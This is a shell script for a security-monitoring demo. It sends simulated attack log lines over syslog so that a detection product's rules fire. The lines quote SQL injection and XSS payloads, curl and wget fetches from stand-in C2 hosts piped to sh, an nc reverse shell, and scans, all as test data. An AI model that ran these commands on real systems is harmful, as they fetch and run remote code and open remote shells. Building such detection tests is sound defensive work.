#!/bin/sh
# =============================================================================
# Ironpost Demo - Attack Simulator
# =============================================================================
# This script generates suspicious log patterns designed to trigger
# Ironpost detection rules and demonstrate alerting capabilities.
#
# Usage:
#   ./simulate-attack.sh [ironpost_host] [syslog_port]
#
# Requirements:
#   - Alpine/busybox compatible (uses 'sh' not 'bash')
#   - netcat (nc) for UDP syslog transmission

set -e

# Configuration
IRONPOST_HOST="${1:-ironpost}"
SYSLOG_PORT="${2:-1514}"
STARTUP_DELAY="${3:-10}"

echo "================================================================"
echo "Ironpost Demo - Attack Simulator"
echo "================================================================"
echo ""
echo "Target: ${IRONPOST_HOST}:${SYSLOG_PORT}"
echo "Startup delay: ${STARTUP_DELAY} seconds"
echo ""
echo "Waiting for Ironpost to be fully ready..."
sleep "${STARTUP_DELAY}"

# Function to send syslog message
# Args: $1=priority, $2=hostname, $3=process, $4=message
send_log() {
    PRIORITY="$1"
    HOSTNAME="$2"
    PROCESS="$3"
    MESSAGE="$4"
    TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

    SYSLOG_MSG="<${PRIORITY}>1 ${TIMESTAMP} ${HOSTNAME} ${PROCESS} - - - ${MESSAGE}"
    echo "${SYSLOG_MSG}" | nc -u -w1 "${IRONPOST_HOST}" "${SYSLOG_PORT}"
}

# Banner
echo "================================================================"
echo "Starting attack simulation..."
echo "================================================================"
echo ""

# =============================================================================
# Attack 1: SSH Brute Force
# =============================================================================
echo "[Attack 1] SSH Brute Force - 5 failed login attempts"
echo "Expected: Trigger 'ssh_brute_force_demo' rule (threshold: 3 in 60s)"
echo ""

for i in 1 2 3 4 5; do
    send_log 38 "target-server" "sshd" "Failed password for root from 203.0.113.42 port 12345 ssh2: RSA"
    echo "  [${i}/5] Sent failed SSH login from 203.0.113.42"
    sleep 1
done

echo ""
sleep 3

# =============================================================================
# Attack 2: SQL Injection
# =============================================================================
echo "[Attack 2] SQL Injection Attempts"
echo "Expected: Trigger 'sql_injection_demo' rule"
echo ""

send_log 30 "webserver02" "nginx" "GET /login?user=admin&password=' OR '1'='1 403 Forbidden"
echo "  [1/3] Classic SQL injection: OR '1'='1"
sleep 1

send_log 30 "webserver02" "nginx" "POST /api/search query=\"name'; DROP TABLE users; --\" 500 Internal Error"
echo "  [2/3] SQL injection: DROP TABLE"
sleep 1

send_log 30 "webserver02" "nginx" "GET /products?id=1 UNION SELECT password FROM admin 403 Forbidden"
echo "  [3/3] SQL injection: UNION SELECT"

echo ""
sleep 3

# =============================================================================
# Attack 3: XSS Attack
# =============================================================================
echo "[Attack 3] Cross-Site Scripting (XSS)"
echo "Expected: Trigger 'xss_attack' rule"
echo ""

send_log 30 "webserver02" "nginx" "GET /search?q=<script>alert('XSS')</script> 403 Forbidden"
echo "  [1/2] XSS: <script> tag injection"
sleep 1

send_log 30 "webserver02" "nginx" "GET /profile?name=<img src=x onerror=alert(1)> 403 Forbidden"
echo "  [2/2] XSS: onerror event handler"

echo ""
sleep 3

# =============================================================================
# Attack 4: Privilege Escalation
# =============================================================================
echo "[Attack 4] Privilege Escalation Attempts"
echo "Expected: Trigger 'unauthorized_sudo' rule"
echo ""

send_log 38 "target-server" "sudo" "user www-data attempted to run sudo -i (unauthorized)"
echo "  [1/2] Unauthorized sudo attempt by www-data"
sleep 1

send_log 38 "target-server" "sudo" "user guest attempted to run sudo su - root (unauthorized)"
echo "  [2/2] Unauthorized sudo su attempt"

echo ""
sleep 3

# =============================================================================
# Attack 5: Suspicious Downloads
# =============================================================================
echo "[Attack 5] Malicious Download Activity"
echo "Expected: Trigger 'suspicious_download' rule"
echo ""

send_log 38 "target-server" "bash" "wget http://malicious.example.com/payload.sh -O /tmp/exploit.sh"
echo "  [1/3] wget from malicious domain"
sleep 1

send_log 38 "target-server" "bash" "curl -s http://c2.evil.com/backdoor.elf | sh"
echo "  [2/3] curl from C2 server"
sleep 1

send_log 38 "target-server" "bash" "wget http://198.51.100.99/rootkit.tar.gz -P /var/tmp"
echo "  [3/3] wget from suspicious IP"

echo ""
sleep 3

# =============================================================================
# Attack 6: Reverse Shell
# =============================================================================
echo "[Attack 6] Reverse Shell Attempts"
echo "Expected: Trigger 'reverse_shell' rule"
echo ""

send_log 38 "target-server" "bash" "nc -e /bin/bash 198.51.100.50 4444"
echo "  [1/2] Netcat reverse shell"
sleep 1

send_log 38 "target-server" "python" "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
echo "  [2/2] Python pty spawn"

echo ""
sleep 3

# =============================================================================
# Attack 7: Port Scanning
# =============================================================================
echo "[Attack 7] Port Scan Activity"
echo "Expected: Trigger 'port_scan_demo' rule (threshold: 5 in 30s)"
echo ""

for port in 22 23 80 443 3306 5432 6379 8080; do
    send_log 38 "gateway01" "kernel" "SYN packet to port ${port} from 198.51.100.99 blocked"
    echo "  [${port}] SYN probe from 198.51.100.99"
    sleep 0.5
done

echo ""
sleep 3

# =============================================================================
# Attack 8: Network Enumeration
# =============================================================================
echo "[Attack 8] Network Reconnaissance"
echo "Expected: Trigger 'network_enum' rule"
echo ""

send_log 38 "target-server" "bash" "nmap -sS -p- 192.168.1.0/24"
echo "  [1/2] nmap SYN scan"
sleep 1

send_log 38 "target-server" "bash" "nc -z 192.168.1.50 1-65535"
echo "  [2/2] netcat port sweep"

echo ""
sleep 3

# =============================================================================
# Attack 9: Critical File Modification
# =============================================================================
echo "[Attack 9] System Integrity Violation"
echo "Expected: Trigger 'critical_file_mod' rule"
echo ""

send_log 38 "target-server" "vim" "File modified: /etc/passwd"
echo "  [1/3] /etc/passwd modified"
sleep 1

send_log 38 "target-server" "vim" "File modified: /etc/shadow"
echo "  [2/3] /etc/shadow modified"
sleep 1

send_log 38 "target-server" "vim" "File modified: /home/admin/.ssh/authorized_keys"
echo "  [3/3] SSH authorized_keys modified"

echo ""
sleep 3

# =============================================================================
# Attack 10: Service Manipulation
# =============================================================================
echo "[Attack 10] Defense Evasion - Service Manipulation"
echo "Expected: Trigger 'service_manipulation' rule"
echo ""

send_log 38 "target-server" "systemd" "Service firewalld stopped"
echo "  [1/2] Firewall service stopped"
sleep 1

send_log 38 "target-server" "systemd" "Service iptables disabled"
echo "  [2/2] iptables disabled"

echo ""
sleep 2

# =============================================================================
# Summary
# =============================================================================
echo "================================================================"
echo "Attack simulation complete!"
echo "================================================================"
echo ""
echo "Summary:"
echo "  - 10 attack scenarios simulated"
echo "  - 35+ malicious events generated"
echo "  - Expected alerts: 10-15 depending on thresholds"
echo ""
echo "Next steps:"
echo "  1. Check Ironpost logs: docker logs ironpost-daemon"
echo "  2. Query alerts: ironpost-cli status"
echo "  3. View container isolation: docker ps -a"
echo ""
echo "All attack patterns have been sent to ${IRONPOST_HOST}:${SYSLOG_PORT}"
